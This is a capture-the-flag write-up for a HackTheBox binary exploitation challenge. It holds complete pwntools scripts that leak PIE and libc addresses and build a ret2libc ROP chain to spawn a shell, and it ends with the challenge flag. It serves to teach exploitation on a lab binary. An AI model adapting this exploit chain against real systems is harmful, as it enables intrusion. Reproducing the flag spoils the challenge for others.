# Space pirate: Retribution
> Write-up author: jon-brandy
## DESCRIPTION:
We got access to the Admin Panel! The last part of the mission is to change the target location of the missiles. We can probably target Draeger's HQ or some other Golden Fang's spaceships. Draeger's HQ might be out of the scope for now, but we can certainly cause significant damage to his army.

## HINT:
- NONE
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, not stripped, and a libc library.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/71b7f1fc-7a3a-4800-8be5-f3ea631a6329)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e19b3a92-ed10-4d5d-9a43-85f23f2a6ce7)


2. After decompiled the binary, it seems there's no interesting function to jump to, seems the concept here is `ret2libc`.
3. Anyway the 2nd option should be our interest.

> 2nd option --> missile_launcher()

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/caa6805d-24a7-4b0f-8f96-0b0b7e0983a8)


4. Let's run the binary then.

> Let's try by send \n --> got unreadable bytes (need to unpack it).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/68cf34dd-2d88-4d88-a5f2-114efc77f448)



5. Knowing this result, we can unpack it then format it to hex again, this should be a potential pie leak. Well this challenge is interesting, took me a while to leak the pie and calculate it correctly. Because if we leak it by sending newline, we shall have only 3/4 of the leaked PIE.

> MY WAY TO GET THE FULLY LEAKED PIE

6. I think my solution is kinda unintended, but if it works what can you say. So i tried by sending 7 bytes, why no 8?? Well in c language, we know our input will have \0 at the end. So 7 bytes input shall count as 8. However i tried sending 8 bytes too but resulting to no leaked pie.

> SENDING 7 BYTES

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8b80ac64-b55e-4b68-8a5c-5f22d4288f1e)


> GETTING PIE_BASE

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1b63b9df-2582-4f88-9dbd-4fd8ac1177dc)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c51d377d-b2cf-4c27-8728-8c8d802b233b)


> CALCULATED PIE BASE - BOTH ARE EQUAL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/870f8e25-419f-4be3-9b7a-2d7093a18acc)


> PIE_BASE SCRIPT

```py
from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './sp_retribution'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
pause()
sh.sendlineafter(b'>> ', b'2')
# sending 7 bytes remembering there's null bytes so will be exact 8.
sh.sendlineafter(b'= ', b'AAAAAAA') 

## GRABBING PIE
sh.recvuntil(b'y = AAAAAAA\n')
get = sh.recvline().strip()
print('THIS IS -->',get)

leak = unpack(get.ljust(8,b'\x00'))
#print(leak)
log.success('LEAKED PIE --> %#0x', leak)
elf.address = leak - 3440
log.success('Calculated pie_base --> %#0x', elf.address)

sh.interactive()
```

7. Great! Now all we need is to leak the libc_puts address, then we can calculate the libc_base. 

> It's good knowing we have puts@got.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/41b541b2-2f67-42f8-9f2d-5a282d5135fc)


8. There are few steps we need:

- Grab the rdi gadget, then calculate it with base address.
- get the RIP offset.
- Checks interesting function to return to (need to loop so we can grab the leaked puts@got address.

```
padding + rdi_gadget + puts@got + puts@plt + sym.missile_launcher
```

> GRAB RDI & calc it with base address

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/663da213-f5fd-4546-93dc-a37d075b06bd)

```
rdi_gadget = elf.address + ropper_rdi
```

> RIP Offset --> 88

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6b13e269-c74e-4545-a498-a1b9481ca215)


> LEAK LIBC SNIPPET

```py
pop_rdi = 0x0000000000000d33
log.success('pop_rdi_gadget --> %#0x', pop_rdi)

calc_rdi = elf.address + pop_rdi
log.success('Calculated pop_rdi gadget --> %#0x', calc_rdi)

padding = 88
p = flat([
    asm('nop') * padding,
    calc_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
])

sh.sendlineafter(b':', p)
```

> RESULT - LEAKED LIBC PUTS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8711dfc3-eddb-445f-b8a1-ea819fd8f5dc)


> FULL SCRIPT - GRAB LIBC PUTS & CALCULATE THE LIBC_BASE

```py
from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './sp_retribution'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
pause()
sh.sendlineafter(b'>> ', b'2')
# sending 7 bytes remembering there's null bytes so will be exact 8.
sh.sendlineafter(b'= ', b'AAAAAAA') 

## GRABBING PIE
sh.recvuntil(b'y = AAAAAAA\n')
get = sh.recvline().strip()
print('THIS IS -->',get)

leak = unpack(get.ljust(8,b'\x00'))
#print(leak)
log.success('LEAKED PIE --> %#0x', leak)
elf.address = leak - 3440
log.success('Calculated pie_base --> %#0x', elf.address)

pop_rdi = 0x0000000000000d33
log.success('pop_rdi_gadget --> %#0x', pop_rdi)

calc_rdi = elf.address + pop_rdi
log.success('Calculated pop_rdi gadget --> %#0x', calc_rdi)

padding = 88
p = flat([
    asm('nop') * padding,
    calc_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
])

sh.sendlineafter(b':', p)

sh.recvline()
sh.recvline()

get = sh.recvline().strip()
#print('PUTS -->',get)

leaked_puts = unpack(get.ljust(8,b'\x00'))
log.success('LEAKED PUTS --> %#0x', leaked_puts)

libc.address = leaked_puts - libc.sym['puts'] #456352 --> using vmmap shall gave the same result
log.info('LIBC BASE --> %#0x', libc.address)
```

9. Finally we just need to send our `system("/bin/sh");` payload.

```
padding + rdi + /bin/sh\x00 + sym.system
```

> FINAL SCRIPT

```py
from pwn import *
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './sp_retribution'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

library = './glibc/libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
#pause()
sh.sendlineafter(b'>> ', b'2')
# sending 7 bytes remembering there's null bytes so will be exact 8.
sh.sendlineafter(b'= ', b'AAAAAAA') 

## GRABBING PIE
sh.recvuntil(b'y = AAAAAAA\n')
get = sh.recvline().strip()
print('THIS IS -->',get)

leak = unpack(get.ljust(8,b'\x00'))
#print(leak)
log.success('LEAKED PIE --> %#0x', leak)
elf.address = leak - 3440
log.success('Calculated pie_base --> %#0x', elf.address)

pop_rdi = 0x0000000000000d33
log.success('pop_rdi_gadget --> %#0x', pop_rdi)

calc_rdi = elf.address + pop_rdi
log.success('Calculated pop_rdi gadget --> %#0x', calc_rdi)

padding = 88
p = flat([
    asm('nop') * padding,
    calc_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
])

sh.sendlineafter(b':', p)

sh.recvline()
sh.recvline()

get = sh.recvline().strip()
#print('PUTS -->',get)

leaked_puts = unpack(get.ljust(8,b'\x00'))
log.success('LEAKED PUTS --> %#0x', leaked_puts)

libc.address = leaked_puts - libc.sym['puts'] #456352 --> using vmmap shall gave the same result
log.info('LIBC BASE --> %#0x', libc.address)

pay = flat([
    asm('nop') * padding,
    calc_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
])

sh.sendlineafter(b'>>', b'2')
sh.sendlineafter(b'y =', b'')
sh.sendlineafter(b':', pay) 

sh.interactive()
```

> TEST LOCALLY - GOT SHELL!

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f2065e38-aa4b-4ef0-9bd3-02466b501f18)


> TEST REMOTELY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/70d83856-72fe-4fe4-b351-a279ad10f342)


10. Got the flag!


## FLAG
```
HTB{w3_f1n4lly_m4d3_1t}
```
